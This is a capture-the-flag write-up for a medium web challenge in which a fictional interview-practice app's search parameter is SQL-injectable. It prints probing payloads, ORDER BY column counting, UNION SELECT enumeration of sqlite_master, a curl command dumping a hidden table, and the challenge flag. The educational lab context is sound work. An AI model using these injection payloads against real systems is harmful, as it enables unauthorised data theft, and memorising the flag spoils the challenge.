# The Hidden Test Case

**Event:** CryoVault CTF 2026
**Category:** web
**Flag:** `isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}`

---

Event: CRYOVAULT
Category: Web / SQL Injection
Difficulty: Medium
Points: 50
Target: https://isfcrpesu-hidden-test-case.chals.io/
Flag: `isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}`

## Recon

The target is "LeetVault", a fictional interview-practice platform (gunicorn/Flask).
Landing page, `/problems`, `/challenge`, `/login`. The `/challenge` page names the
vulnerability class outright: *Web / SQL Injection*, and the brief says records appear
to be missing but the DB team insists everything is normal - a nudge toward hidden rows
reachable only through the data layer.

`/problems` is a search UI that calls:

```
GET /api/problems?search=<query>
```

Baseline (empty query) returns 6 public problems, ids 1 - 6:

```
{"count":6,"query":"","results":[{"id":1,"title":"Two Sum","category":"Arrays","difficulty":"Easy"}, ...]}
```

## Finding the injection

Probing the `search` parameter:

| payload            | http | result                          |
|--------------------|------|---------------------------------|
| `` ' ``            | 400  | "legacy search service rejected" |
| `` '' ``           | 200  | 0 results                       |
| `%`                | 200  | all 6                           |
| `' OR '1'='1`      | 200  | all 6                           |
| `x' OR '1'='1`     | 200  | 0                               |

The key tell: a lone `'` yields HTTP 400, but a *balanced* `' OR '1'='1` yields rows.
That 400 is not a WAF - it is the Flask handler catching a `sqlite3` syntax error from
an unbalanced quote and rewriting it as a friendly "rejected that query" message.
Balanced payloads execute normally, and `' OR '1'='1` returning every row confirms the
input is concatenated raw into the query.

The query is, in effect:

```sql
SELECT id, title, category, difficulty
FROM problems
WHERE title LIKE '%<search>%'
```

So `search = ' OR '1'='1` becomes `... WHERE title LIKE '%' OR '1'='1%'` → all rows.
(`x' OR '1'='1` prepends `x` to the LIKE prefix so the first branch matches nothing and
`'1'='1%'` is false → 0 rows, which independently confirms the concatenation point.)

## Exploitation

**1. Column count.** `' order by 4-- ` returns 200; `' order by 5-- ` returns 400.
Four columns. The result JSON renames them to `id, title, category, difficulty`.

**2. Schema.** SQLite 3.46.1 (`' UNION SELECT sqlite_version(),2,3,4-- `). Dumping
`sqlite_master` reveals three tables:

- `categories(id, name, problem_count)`
- `internal_notes(id, note_type, content, created_at)`  ← interesting
- `problems(id, title, difficulty, category, description, starter_code, is_public)`

Note `problems.is_public` - the app only shows `is_public = 1` rows, which is the
in-fiction "missing records" behaviour. But the real prize is `internal_notes`.

**3. Dump.**

```bash
curl -s --get 'https://isfcrpesu-hidden-test-case.chals.io/api/problems' \
  --data-urlencode "search=' UNION SELECT id,note_type,content,created_at FROM internal_notes-- "
```

The two notes returned:

```
id=1 note_type='legacy_migration' content='Migration verification complete.
        Hidden test case: isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}' created_at='2023-10-31'

id=2 note_type='ops_reminder'    content='Retire the old search service after the
        migration audit is signed off.'                     created_at='2023-11-01'
```

## Flag

```
isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}
```

## Takeaways

- A 400 on a single quote is often a *symptom* of injectable concatenation, not proof of
  a WAF. Compare unbalanced vs balanced quote payloads: if balanced ones execute, it's SQLi.
- `-- ` (dash-dash-**space**) is required to comment out the app's trailing `%'`.
- The "hidden record" was a leaked operational note table, not an `is_public=0` problem
  row - always enumerate `sqlite_master` and dump every table rather than guessing.

